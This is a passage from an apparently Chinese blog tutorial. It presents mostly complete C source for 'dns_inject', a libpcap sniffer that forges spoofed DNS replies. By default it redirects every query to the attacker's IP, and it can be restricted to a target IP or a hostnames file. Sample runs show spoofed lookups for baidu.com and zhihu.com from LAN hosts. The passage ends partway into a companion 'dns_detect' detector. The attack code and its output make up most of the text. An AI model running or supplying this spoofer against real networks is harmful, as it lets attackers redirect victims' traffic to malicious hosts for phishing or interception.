		reply_ip_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span><span class="token punctuation">)</span> reply_packet<span class="token punctuation">;</span>
		reply_udp_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>reply_packet <span class="token operator">+</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_hl <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_v <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_tos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span><span class="token punctuation">)</span> <span class="token operator">+</span> reply_packet_size<span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_ttl <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_p <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_src<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>dst_ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
		reply_ip_hdr<span class="token operator">-&gt;</span>ip_dst<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>src_ip<span class="token punctuation">)</span><span class="token punctuation">;</span>

		reply_udp_hdr<span class="token operator">-&gt;</span>source <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		reply_udp_hdr<span class="token operator">-&gt;</span>dest <span class="token operator">=</span> udp<span class="token operator">-&gt;</span>source<span class="token punctuation">;</span>
		reply_udp_hdr<span class="token operator">-&gt;</span>len <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span><span class="token punctuation">)</span> <span class="token operator">+</span> reply_packet_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
		reply_udp_hdr<span class="token operator">-&gt;</span>check <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

		reply_ip_hdr<span class="token operator">-&gt;</span>ip_sum <span class="token operator">=</span> <span class="token function">find_checksum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span> reply_packet<span class="token punctuation">,</span> reply_ip_hdr<span class="token operator">-&gt;</span>ip_len <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">/* 使用ip和udp报头更新数据包大小 */</span>
		reply_packet_size <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">/* 发送我们的dns欺骗响应 */</span>
		<span class="token function">send_dns_reply</span><span class="token punctuation">(</span>src_ip<span class="token punctuation">,</span> <span class="token function">ntohs</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">u_int16_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>udp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> reply_packet<span class="token punctuation">,</span> reply_packet_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Spoofed %s requested from %s\n"</span><span class="token punctuation">,</span> request<span class="token punctuation">,</span> src_ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Not Spoofing %s requested from %s as it's not listed in file.\n"</span><span class="token punctuation">,</span> request<span class="token punctuation">,</span> src_ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>


	<span class="token function">memset</span><span class="token punctuation">(</span>errbuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PCAP_ERRBUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* Parse the command line arguments */</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>option <span class="token operator">=</span> <span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"i:f:h"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">switch</span> <span class="token punctuation">(</span>option<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">case</span> <span class="token char">'i'</span><span class="token operator">:</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>interface_provided<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You should provide only one device. Multiple devices "</span>
				       <span class="token string">"are not supported.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			dev <span class="token operator">=</span> optarg<span class="token punctuation">;</span>
			interface_provided <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token char">'f'</span><span class="token operator">:</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>read_file<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You should provide only one file. Multiple files "</span>
				       <span class="token string">"are not supported.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			file_name <span class="token operator">=</span> optarg<span class="token punctuation">;</span>
			read_file <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token char">'h'</span><span class="token operator">:</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"help: dns_inject [-i interface] [-f hostnames] &lt;expression&gt;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">default</span><span class="token operator">:</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"unknown option or missing argument! Exiting.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token comment">/* 如果用户未提供接口，则通过pcap库进行设置 */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>interface_provided <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		dev <span class="token operator">=</span> <span class="token function">pcap_lookupdev</span><span class="token punctuation">(</span>errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>dev <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't find default device: %s\n"</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token comment">/* 如果hostnames文件是由用户提供的，则解析该文件 */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>read_file <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		FILE <span class="token operator">*</span>fptr <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>file_name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fptr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"failed to open input.txt\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		head <span class="token operator">=</span> current <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>read <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>line<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">,</span> fptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>read <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Malformed File.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">goto</span> free_list<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		<span class="token punctuation">}</span>
		<span class="token function">fclose</span><span class="token punctuation">(</span>fptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> 
	<span class="token keyword">else</span> 
	<span class="token punctuation">{<!-- --></span> <span class="token comment">/* 未提供文件-使用攻击者IP欺骗所有文件 */</span>
		<span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token operator">*</span>new_node <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">get_ip_of_attacker</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> spoof_ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>new_node<span class="token operator">-&gt;</span>spoof_ip<span class="token punctuation">,</span> spoof_ip<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		new_node<span class="token operator">-&gt;</span>spoof_ip<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>new_node<span class="token operator">-&gt;</span>spoof_domain<span class="token punctuation">,</span> <span class="token string">"spoof_all"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		new_node<span class="token operator">-&gt;</span>spoof_domain<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
		head <span class="token operator">=</span> new_node<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_lookupnet</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>net<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Can't get netmask for device %s\n"</span><span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
		net <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		mask <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	handle <span class="token operator">=</span> <span class="token function">pcap_open_live</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> BUFSIZ<span class="token punctuation">,</span> PROMISC<span class="token punctuation">,</span> READ_TIME_OUT<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't open device %s: %s\n"</span><span class="token punctuation">,</span> dev<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> free_list<span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Listening on device: %s\n\n"</span><span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">/* 生成最终BPF过滤器字符串 */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>bpf_filter <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		filter_exp <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>dns_filter<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>bpf_filter_exp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcpy</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> dns_filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcat</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> <span class="token string">" and "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcat</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> bpf_filter_exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		filter_exp <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>dns_filter<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcpy</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> dns_filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token comment">/* apply the filter */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_setfilter</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't install filter %s: %s\n"</span><span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span>
		        <span class="token function">pcap_geterr</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> free_filter<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">/* set our callback function with infinite pcap_loop */</span>
	<span class="token function">pcap_loop</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>pcap_handler<span class="token punctuation">)</span>dns_spoof<span class="token punctuation">,</span> <span class="token punctuation">(</span>u_char <span class="token operator">*</span><span class="token punctuation">)</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* clean up */</span>
	<span class="token function">pcap_freecode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">pcap_close</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>如果在没有任何选项的情况下运行命令，则所有请求都会被欺骗，并且atacker会收到被欺骗的请求的通知.</p> 
<p>[root@localhost minger]# ./dns_inject<br> Listening on device: ens33</p> 
<p>Spoofed www.baidu.com requested from 192.168.67.129<br> Spoofed www.zhihu.com requested from 192.168.67.131</p> 
<p>用户可以指定表达式来攻击特定的IP，如下所示。以下示例中的此表达式确保只有来自的DNS查询</p> 
<p>192.168.67.131被欺骗。来自任何其他IP的请求都不会被欺骗。</p> 
<p>[root@localhost minger]# ./dns_inject -i ens33 “ip src 192.168.67.131”<br> Listening on device: ens33</p> 
<p>Spoofed www.baidu.com requested from 192.168.67.131<br> Spoofed www.zhihu.com requested from 192.168.67.131</p> 
<p>如果使用-f选项指定文件，则仅为发送欺骗DNS回复文件中列出的网站。欺骗回复包含相应的文件中指定的IP。如果未列出域，则攻击者为通知请求的域，并通知它没有被欺骗。</p> 
<p><img src="https://images2.imgbox.com/f2/b5/ihJ9w9kz_o.png" alt=""></p> 
<ul><li>dns_detect</li></ul> 
<pre><code class="prism language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PROMISC</span> <span class="token expression"><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">READ_TIME_OUT</span> <span class="token expression"><span class="token number">0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE_ETHERNET</span> <span class="token expression"><span class="token number">14</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IP_SIZE</span> <span class="token expression"><span class="token number">16</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PACKET_SIZE</span> <span class="token expression"><span class="token number">8192</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_ARRAY_SIZE</span> <span class="token expression"><span class="token number">1000</span></span></span>

<span class="token comment">/* Ethernet header */</span>
<span class="token keyword">struct</span> <span class="token class-name">ethernet_header</span> <span class="token punctuation">{<!-- --></span>
	u_char ether_dhost<span class="token punctuation">[</span>ETHER_ADDR_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
	u_char ether_shost<span class="token punctuation">[</span>ETHER_ADDR_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
	u_short ether_type<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">/* DNS header */</span>
<span class="token keyword">struct</span> <span class="token class-name">dns_header</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">char</span> id<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> flags<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> qdcount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> ancount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> nscount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> arcount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>


<span class="token comment">/* DNS Question structure */</span>
<span class="token keyword">struct</span> <span class="token class-name">dns_question</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">char</span> <span class="token operator">*</span>qname<span class="token punctuation">;</span>
	<span class="token keyword">char</span> qtype<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> qclass<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>



<span class="token keyword">static</span> <span class="token keyword">int</span> array_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>


<span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token punctuation">{<!-- --></span>
	u_short id<span class="token punctuation">;</span>	
	<span class="token keyword">int</span> list_size<span class="token punctuation">;</span>
	<span class="token keyword">char</span> ip<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>



<span class="token keyword">void</span> <span class="token function">dns_detect</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token operator">*</span>database<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pcap_pkthdr</span> <span class="token operator">*</span>header<span class="token punctuation">,</span> <span class="token keyword">const</span> u_char <span class="token operator">*</span>packet<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token comment">/* define ethernet header */</span>
	ether <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ethernet_header</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>
	ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">iphdr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>packet<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* udp header */</span>
	ip_header_size <span class="token operator">=</span> ip<span class="token operator">-&gt;</span>ihl <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span>
	udp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> ip<span class="token punctuation">)</span> <span class="token operator">+</span> ip_header_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* dns header */</span>
	dns_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dns_header</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> udp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">udphdr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* start of question */</span>
	question<span class="token punctuation">.</span>qname <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dns_hdr <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	 * parse domain name
	 */</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token comment">/* start of answer */</span>
	answer_start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>question<span class="token punctuation">.</span>qname <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>

	<span class="token comment">/* 正在保存DNS的当前ID */</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u_short <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>dns_hdr<span class="token operator">-&gt;</span>ancount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		type <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u_short <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>answer_start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
